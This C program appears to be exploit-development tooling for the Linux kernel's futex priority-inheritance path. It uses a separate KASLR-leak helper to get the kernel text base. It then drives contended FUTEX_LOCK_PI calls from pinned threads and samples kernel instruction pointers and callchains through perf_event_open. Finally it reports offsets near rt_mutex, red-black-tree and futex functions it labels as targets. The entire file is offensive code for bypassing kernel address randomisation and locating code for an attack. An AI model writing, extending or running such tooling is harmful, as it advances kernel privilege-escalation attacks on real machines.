/* futex_pi_hard.c — maximize PI-chain-walk (owner holds, N waiters queue),
 * perf on main; print top offsets inside tight ranges around the A.127 targets. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"
#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 16
#define MAXO 900000
static uint64_t offs[MAXO]; static int no;
static volatile int fut=0, stop=0;
static inline long xf(void*u,int op){ return syscall(98,u,op,0,0,0,0); }
#define FLPI (6|128)
#define FUPI (7|128)

static void* holder(void*x){ (void)x;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    xf(&fut,FLPI);
    while(!stop){ usleep(8000); }        /* hold long, let waiters pile up */
    xf(&fut,FUPI); return 0;
}
static void* waiter(void*x){ (void)x;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    while(!stop){ xf(&fut,FLPI); xf(&fut,FUPI); }
    return 0;
}
static void drain(void*base,size_t pg,size_t ds,struct perf_event_mmap_page*meta,uint64_t kt){
    char*d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header*h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char*q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(ip>=0xffff000000000000UL&&no<MAXO) offs[no++]=ip-kt;
            if(nr>64)nr=64;
            for(uint64_t k=0;k<nr;k++){uint64_t c;memcpy(&c,q,8);q+=8;
                if(c>=0xffff000000000000UL&&no<MAXO) offs[no++]=c-kt;}
        }
        meta->data_tail+=h->size;
    }
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t kt=kaaslr_text_base(); for(int r=0;r<6&&!kt;r++) kt=kaaslr_text_base();
    printf("[*] _text=%#018llx\n",(unsigned long long)kt); if(!kt)return 1;
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs); }
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=800; /* dense */
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){printf("[!] perf %d\n",errno);return 1;}
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void*base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){printf("[!] mmap %d\n",errno);return 1;}
    struct perf_event_mmap_page*meta=base;
    pthread_t h,w[6];
    pthread_create(&h,0,holder,0); usleep(30000);
    for(int i=0;i<6;i++) pthread_create(&w[i],0,waiter,0);
    usleep(30000);
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(int i=0;i<500&&no<MAXO;i++){ xf(&fut,FLPI); xf(&fut,FUPI); drain(base,pg,ds,meta,kt); }
    drain(base,pg,ds,meta,kt);
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
    stop=1; pthread_join(h,0); for(int i=0;i<6;i++) pthread_join(w[i],0);
    munmap(base,ms); close(fd);
    printf("[*] offsets=%d\n",no);
    struct{long lo,hi;const char*nm;}R[]={
        {0x9f1300,0x9f1800,"rb_insert_color(.153c)"},
        {0x9f1600,0x9f1a00,"rb_erase(.16ac)"},
        {0x14f7000,0x14f8200,"remove_waiter(.7d0c)"},
        {0x14f81f4,0x14f9400,"rt_mutex_adjust_prio_chain"},
        {0x277038,0x279200,"do_futex"},
        {0x27a8fc,0x27b600,"futex_lock_pi"},
    };
    for(unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
        int c=0;uint64_t mn=~0ull,mx=0;
        for(int i=0;i<no;i++)if((long)offs[i]>=R[r].lo&&(long)offs[i]<R[r].hi){c++;if(offs[i]<mn)mn=offs[i];if(offs[i]>mx)mx=offs[i];}
        printf("HIT %-30s count=%-7d",R[r].nm,c);
        if(c)printf(" [%#lx..%#lx]",(unsigned long)mn,(unsigned long)mx);
        printf("\n");
    }
    return 0;
}
